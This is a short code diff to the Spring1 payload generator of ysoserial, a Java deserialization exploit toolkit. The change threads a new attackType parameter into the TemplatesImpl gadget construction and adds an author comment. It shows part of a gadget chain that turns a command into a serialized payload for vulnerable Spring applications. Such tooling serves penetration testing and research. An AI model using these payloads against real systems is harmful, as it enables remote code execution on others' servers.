@@ -52,9 +52,11 @@ import ysoserial.payloads.util.Reflections;
 @Dependencies({"org.springframework:spring-core:4.1.4.RELEASE","org.springframework:spring-beans:4.1.4.RELEASE"})
 @Authors({ Authors.FROHOFF })
 public class Spring1 extends PayloadRunner implements ObjectPayload<Object> {
+	
+	//federicodotta - All supported (templateImpl)
 
 	public Object getObject(final String command, String attackType) throws Exception {
-		final Object templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command, attackType);
 
 		final ObjectFactory objectFactoryProxy =
 				Gadgets.createMemoitizedProxy(Gadgets.createMap("getObject", templates), ObjectFactory.class);
